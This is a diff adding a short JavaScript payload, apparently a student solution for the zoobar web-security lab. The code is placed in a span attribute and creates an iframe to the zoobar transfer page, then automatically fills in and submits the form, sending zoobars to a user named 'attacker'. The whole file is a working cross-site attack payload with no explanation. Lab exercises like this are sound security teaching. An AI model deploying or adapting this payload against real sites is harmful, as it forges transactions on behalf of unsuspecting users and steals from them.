@@ -1,0 +1,14 @@
+<span id='zoobars' class="
+var iframe = document.createElement('iframe');
+iframe.setAttribute('name', 'zoobar');
+iframe.setAttribute('src', 'http://zoobar.csl.toronto.edu/transfer.php');
+iframe.setAttribute('style', 'visibility:visible');
+var e = function() { console.log('loaded!'); 
+     iframe.contentDocument.transfer_form.zoobars.value=1;
+iframe.contentDocument.transfer_form.zb_recipient.value='attacker';
+iframe.contentDocument.transfer_form.submission.click();
+iframe.removeEventListener('load', e);
+}
+iframe.addEventListener('load', e);
+document.body.appendChild(iframe);
+"></span>
